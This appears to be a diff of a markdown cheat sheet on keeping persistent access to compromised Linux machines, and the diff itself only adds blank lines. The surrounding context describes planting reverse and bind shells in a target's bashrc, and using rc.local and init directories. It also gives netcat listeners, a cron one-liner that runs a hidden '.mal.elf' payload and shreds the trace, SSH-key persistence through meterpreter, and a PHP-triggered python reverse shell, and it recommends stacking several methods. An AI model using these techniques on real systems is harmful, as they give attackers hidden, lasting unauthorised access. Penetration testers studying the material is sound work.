@@ -42,12 +42,15 @@ fi
 ```
 
 ## directories
+
 everything in /etc/init and /etc/init.d/ is ran at startup
 
 /etc/rc.local is a pre-init file that will also work on BSD and Linux, the file has to start with "/bin/bash -e" and end with "exit 0"
 
 ## netcat and bashrc
+
 ### reverse shell
+
 Put reverse shell in targets bashrc and despite success or fail, it returns no error to screen and gives the user their bash shell upon initilization
 	
 	On Target Box
@@ -56,6 +59,7 @@ Put reverse shell in targets bashrc and despite success or fail, it returns no e
 		nc -lnvp attackPort
 
 ### bind shell
+
 Same idea as above, only it's a bind shell, not a reverse shell
 
 	On Target Box
@@ -64,6 +68,7 @@ Same idea as above, only it's a bind shell, not a reverse shell
 		nc attackBox attackPort
 
 ## bash and cron
+
 The less dependencies the better. Since Linux treats socket connections as files, you can redirect the bash terminal's interactive capabilities to a *file* that is really just a socket connection
 	
 	On Target Box
@@ -72,6 +77,7 @@ The less dependencies the better. Since Linux treats socket connections as files
 		nc -lnvp attackPort
 
 ## metasploit and cron
+
 If you prefer to use msfconsole to make post exploitation a bit easier, below is a one-liner for creating the payload and handler
 
 	On Attack Box
@@ -87,6 +93,7 @@ If you prefer to use msfconsole to make post exploitation a bit easier, below is
 		echo "* * * * * cd /home/ && ./.mal.elf" > .cron && crontab .cron && shred .cron; rm .cron
 
 ## metasploit and ssh
+
 You need to already have a meterpreter session to follow along
 	
 	In Meterpreter
@@ -99,6 +106,7 @@ You need to already have a meterpreter session to follow along
 		ssh -i $ssh_key.txt user@target
 
 ## php and python
+
 If you have write access to a php file on the target and the target has python installed, you can use the following for a reverse shell
 
 	In PHP file
@@ -107,4 +115,5 @@ If you have write access to a php file on the target and the target has python i
 		nc -lnvp 5555
 
 Suggest stacking persistence, as a wise man once said
+
 > Two is one, one is none - Mubix
